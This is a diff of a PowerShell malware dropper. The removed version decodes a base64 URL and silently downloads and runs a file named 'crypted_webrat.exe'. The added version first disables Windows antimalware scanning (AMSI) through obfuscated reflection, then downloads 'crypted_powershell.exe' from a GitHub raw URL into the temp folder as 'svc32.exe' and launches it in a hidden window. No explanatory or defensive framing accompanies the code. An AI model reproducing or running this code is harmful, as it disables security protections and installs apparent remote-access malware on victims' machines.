@@ -1,5 +1,1 @@
-$h = 'aHR0cHM6Ly9naXRodWIuY29tL21hdHZlanNrbGFyb3Y5LWN5YmVyLy1qandoNi9yYXcvcmVmcy9oZWFkcy9tYWluL2NyeXB0ZWRfd2VicmF0LmV4ZQ=='
-$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($h))
-$p = "$env:TEMP\svc32.exe"
-(New-Object Net.WebClient).DownloadFile($u, $p)
-Start-Process $p -WindowStyle Hidden
+$t=[Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment','.','Auto','mat','ion','.','Am','si','Ut','ils'))) $f=$t.GetField([string]::Join('',('am','si','Init','Fai','led')),[Reflection.BindingFlags]'NonPublic,Static') $f.SetValue($null,$true) $u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe' $p="$env:TEMP\svc32.exe" [System.Net.WebClient]::new().DownloadFile($u,$p) $si=[System.Diagnostics.ProcessStartInfo]::new() $si.FileName=$p;$si.WindowStyle='Hidden';$si.UseShellExecute=$false [System.Diagnostics.Process]::Start($si)|Out-Null
